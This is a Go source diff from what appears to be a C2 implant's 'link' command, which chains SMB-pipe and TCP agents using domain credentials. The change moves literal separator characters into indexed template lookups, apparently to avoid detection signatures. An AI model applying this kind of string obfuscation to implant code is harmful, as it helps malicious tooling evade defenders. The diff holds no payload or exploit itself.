@@ -34,14 +34,11 @@ const (
 	idxLinkPingMarker   = 128
 	idxLinkQuitMarker   = 129
 	idxLinkDot          = 132
+	idxLinkColon        = 347
+	idxLinkPipe         = 348
+	idxLinkBackslash    = 349
 )
 
-// Single-char byte arrays (innocuous, minimal footprint)
-var (
-	lnkColon     = string([]byte{0x3a}) // :
-	lnkBackslash = string([]byte{0x5c}) // \
-	lnkPipe      = string([]byte{0x7c}) // |
-)
 
 // LinkCommand handles the 'link' command for connecting to SMB and TCP agents
 type LinkCommand struct {
@@ -119,8 +116,8 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 
 			// Parse DOMAIN\user format
 			var domain, user string
-			if strings.Contains(userStr, lnkBackslash) {
-				parts := strings.SplitN(userStr, lnkBackslash, 2)
+			if strings.Contains(userStr, c.getTpl(idxLinkBackslash)) {
+				parts := strings.SplitN(userStr, c.getTpl(idxLinkBackslash), 2)
 				domain = parts[0]
 				user = parts[1]
 			} else {
@@ -157,7 +154,7 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 		}
 
 		// Build the TCP address
-		address := targetHost + lnkColon + port
+		address := targetHost + c.getTpl(idxLinkColon) + port
 		return c.linkTCP(address)
 
 	default:
@@ -177,7 +174,7 @@ func (c *LinkCommand) linkSMB(pipePath string, creds *SMBCredentials) CommandRes
 	routingID, err := lm.Link(pipePath, creds)
 	if err != nil {
 		return CommandResult{
-			Output:      ErrCtx(E33, pipePath) + lnkPipe + err.Error(),
+			Output:      ErrCtx(E33, pipePath) + c.getTpl(idxLinkPipe) + err.Error(),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -188,7 +185,7 @@ func (c *LinkCommand) linkSMB(pipePath string, creds *SMBCredentials) CommandRes
 
 	statusPrefix := c.getTpl(idxLinkStatusPrefix)
 	return CommandResult{
-		Output:      statusPrefix + pipePath + lnkPipe + routingID + lnkPipe + handshakeResult,
+		Output:      statusPrefix + pipePath + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -202,7 +199,7 @@ func (c *LinkCommand) linkTCP(address string) CommandResult {
 	routingID, err := lm.LinkTCP(address)
 	if err != nil {
 		return CommandResult{
-			Output:      ErrCtx(E33, address) + lnkPipe + err.Error(),
+			Output:      ErrCtx(E33, address) + c.getTpl(idxLinkPipe) + err.Error(),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -213,7 +210,7 @@ func (c *LinkCommand) linkTCP(address string) CommandResult {
 
 	statusPrefix := c.getTpl(idxLinkStatusPrefix)
 	return CommandResult{
-		Output:      statusPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
+		Output:      statusPrefix + address + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
